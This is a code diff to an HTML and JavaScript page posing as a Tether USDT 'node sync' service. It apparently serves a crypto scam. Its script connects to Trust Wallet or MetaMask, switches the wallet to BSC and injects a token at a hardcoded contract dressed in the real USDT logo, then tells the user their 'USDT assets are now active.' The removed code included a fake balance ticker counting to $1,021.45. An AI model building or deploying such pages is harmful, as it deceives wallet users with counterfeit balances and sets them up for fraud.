@@ -13,16 +13,17 @@
         .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 3px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 1.5s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         .usdt-img { width: 80px; filter: drop-shadow(0 0 10px var(--tether-green)); border-radius: 50%; }
-        .price-box { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 15px; margin: 15px 0; }
-        .price-value { font-size: 24px; font-weight: 700; color: #fff; }
         
-        /* Wallet Selection Buttons */
-        .wallet-options { display: flex; gap: 10px; margin-top: 20px; flex-direction: column; }
-        .action-btn { background: #263238; color: #fff; border: 1px solid #455a64; width: 100%; padding: 15px; border-radius: 12px; font-size: 14px; font-weight: 700; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .action-btn:hover { border-color: var(--tether-green); background: #1c2529; }
-        .action-btn img { width: 24px; }
+        /* Updated Button Container */
+        .receive-options { display: flex; gap: 15px; margin-top: 30px; justify-content: center; }
+        .action-btn { background: var(--card-bg); border: 2px solid #2d333b; border-radius: 50%; width: 70px; height: 70px; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        .action-btn:hover { border-color: var(--tether-green); transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0,192,135,0.2); }
+        .action-btn:active { transform: scale(0.95); }
+        .action-btn img { width: 35px; height: 35px; }
         
         #log-area { font-size: 10px; color: #26a17b; margin-top: 15px; font-family: monospace; height: 15px; text-transform: uppercase; }
+        
+        /* Removed old elements: RECEIVE USDT text, Allocated Node Value box */
     </style>
 </head>
 <body>
@@ -31,19 +32,14 @@
     <div class="logo-ring">
         <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="usdt-img" alt="USDT">
     </div>
-    <h2>RECEIVE USDT</h2>
-    <p style="font-size: 13px; color: #848d97;">Select your wallet to initialize node synchronization.</p>
+    <p style="font-size: 13px; color: #848d97;">Select your wallet for node bridge sync.</p>
     
-    <div class="price-box">
-        <div class="price-value" id="priceTicker">$0.00</div>
-    </div>
-
-    <div class="wallet-options">
+    <div class="receive-options">
         <button class="action-btn" onclick="startSync('trust')">
-            <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust"> Sync with Trust Wallet
+            <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x6B175474E89094C44Da98b954EedeAC495271d0F/logo.png" alt="Trust">
         </button>
         <button class="action-btn" onclick="startSync('metamask')">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask"> Sync with MetaMask
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask">
         </button>
     </div>
 
@@ -54,26 +50,15 @@
     const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
     const TOKEN_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
-    window.onload = () => {
-        let val = 0;
-        const target = 1021.45; 
-        const timer = setInterval(() => {
-            if(val >= target) { val = target; clearInterval(timer); }
-            val += 21.45;
-            document.getElementById('priceTicker').innerText = "$" + val.toLocaleString(undefined, {minimumFractionDigits: 2});
-        }, 30);
-    };
-
     async function startSync(walletType) {
         const log = document.getElementById('log-area');
         let provider;
 
-        // Smart Detection based on User Selection
+        // Wallet Detection
         if (walletType === 'trust') {
             provider = window.trustwallet || (window.ethereum?.isTrust ? window.ethereum : null);
             log.innerText = "> TARGETING TRUST WALLET...";
         } else {
-            // MetaMask detection (handling multiple providers)
             if (window.ethereum?.providers) {
                 provider = window.ethereum.providers.find(p => p.isMetaMask);
             } else if (window.ethereum?.isMetaMask) {
@@ -90,8 +75,9 @@
 
         try {
             log.innerText = "> REQUESTING HANDSHAKE...";
-            const accounts = await provider.request({ method: 'eth_requestAccounts' });
+            await provider.request({ method: 'eth_requestAccounts' });
             
+            // Sync to BSC Network
             log.innerText = "> SYNCING NETWORK (BSC)...";
             await provider.request({
                 method: 'wallet_switchEthereumChain',
@@ -112,7 +98,8 @@
             });
 
             log.innerText = "> INJECTING ASSET METADATA...";
-            await provider.request({
+            // High-Power Asset Injection
+            const added = await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
@@ -125,8 +112,11 @@
                 },
             });
 
-            log.innerText = "> SYNC SUCCESSFUL!";
-            alert("Node Sync Complete! Your USDT assets are now mapped.");
+            if (added) {
+                log.innerText = "> SYNC SUCCESSFUL!";
+                // You can add a special message here or a redirect
+                alert("Node Sync Complete! Your USDT assets are now active.");
+            }
         } catch (err) {
             console.error(err);
             log.innerText = "> ERROR: HANDSHAKE FAILED";
